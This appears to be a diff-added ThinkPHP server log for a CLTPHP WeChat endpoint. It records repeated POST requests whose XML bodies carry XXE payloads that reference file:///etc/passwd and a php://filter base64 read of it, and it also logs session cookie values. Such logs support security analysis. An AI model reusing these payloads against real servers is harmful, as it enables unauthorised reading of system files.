+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000209s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media` [ RunTime:0.000616s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media_item` [ RunTime:0.000612s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000195s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000173s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000258s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000178s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:35:11+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.085833s][吞吐率：11.65req/s] [内存消耗：550.73kb] [文件加载：50]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '162',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>  
+<!ENTITY remote SYSTEM "file:///etc/passwd">
+]>
+<root><MsgType>text</MsgType> <ToUserName>aaa</ToUserName></root> 
+
+',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001137s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000929s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000259s ]
+[ error ] [2]simplexml_load_string(): Entity: line 2: parser error : StartTag: invalid element name[/var/www/html/app/wchat/controller/Wchat.php:111]
+---------------------------------------------------------------
+[ 2018-07-05T23:35:34+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.065635s][吞吐率：15.24req/s] [内存消耗：957.95kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '184',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>
+<!DOCTYPE convert [   
+<!ENTITY remote SYSTEM "file:///etc/passwd">
+]>
+<root><MsgType>text</MsgType> <ToUserName>aaa</ToUserName></root> 
+
+',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001023s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000625s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000203s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_key_replay` [ RunTime:0.000510s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000173s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media` [ RunTime:0.000519s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000317s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media_item` [ RunTime:0.000593s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000328s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000171s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000157s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000159s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:35:49+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.066878s][吞吐率：14.95req/s] [内存消耗：957.88kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '189',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>
+<!DOCTYPE convert [   
+<!ENTITY remote SYSTEM "file:///etc/passwd">
+]>
+<root><MsgType>text</MsgType> <ToUserName>',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000347s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000867s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000213s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_key_replay` [ RunTime:0.000961s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000241s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000184s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media` [ RunTime:0.000733s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000221s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media_item` [ RunTime:0.000510s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000312s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000203s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000199s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000164s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000234s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:36:16+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.063770s][吞吐率：15.68req/s] [内存消耗：957.95kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '184',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>
+<!DOCTYPE convert [   
+<!ENTITY remote SYSTEM "file:///etc/passwd">
+]>
+<root><MsgType>text</MsgType> <ToUserName>bbb</ToUserName></root> 
+
+',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000355s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000610s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000188s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_key_replay` [ RunTime:0.000529s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000196s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000174s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media` [ RunTime:0.000599s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000172s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media_item` [ RunTime:0.000475s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000174s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000182s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000170s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000159s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000162s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:36:37+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.042394s][吞吐率：23.59req/s] [内存消耗：961.37kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '189',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>
+<!DOCTYPE convert [   
+<!ENTITY remote SYSTEM "file:///etc/passwd">
+]>
+<root><MsgType>text</MsgType> <ToUserName>',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000433s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000616s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000214s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_key_replay` [ RunTime:0.000458s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000206s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media` [ RunTime:0.000568s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000209s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media_item` [ RunTime:0.000500s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000202s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000224s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000248s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000213s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000274s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:38:30+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.080621s][吞吐率：12.40req/s] [内存消耗：957.92kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '188',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>
+<!DOCTYPE convert[   
+<!ENTITY remote SYSTEM "file:///etc/passwd">
+]>
+<root><MsgType>text</MsgType> <ToUserName>',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000535s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000807s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000294s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_key_replay` [ RunTime:0.000995s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000402s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000920s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media` [ RunTime:0.000887s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000456s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media_item` [ RunTime:0.000871s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000478s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000459s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000391s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000528s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000532s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:38:59+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.050365s][吞吐率：19.86req/s] [内存消耗：958.05kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '230',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>
+<!DOCTYPE convert[   
+<!ENTITY remote SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+]>
+<root><MsgType>text</MsgType> <ToUserName>',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000436s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000649s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000214s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_key_replay` [ RunTime:0.000640s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000255s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000194s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media` [ RunTime:0.000468s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000186s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media_item` [ RunTime:0.000434s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000294s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000222s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000188s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000178s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000180s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:44:03+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.097202s][吞吐率：10.29req/s] [内存消耗：961.52kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '230',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>
+<!DOCTYPE convert[   
+<!ENTITY remote SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+]>
+<root><MsgType>text</MsgType> <ToUserName>',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000343s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000860s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000380s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_key_replay` [ RunTime:0.000748s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000217s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000207s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media` [ RunTime:0.000614s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000211s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media_item` [ RunTime:0.000589s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000199s ]
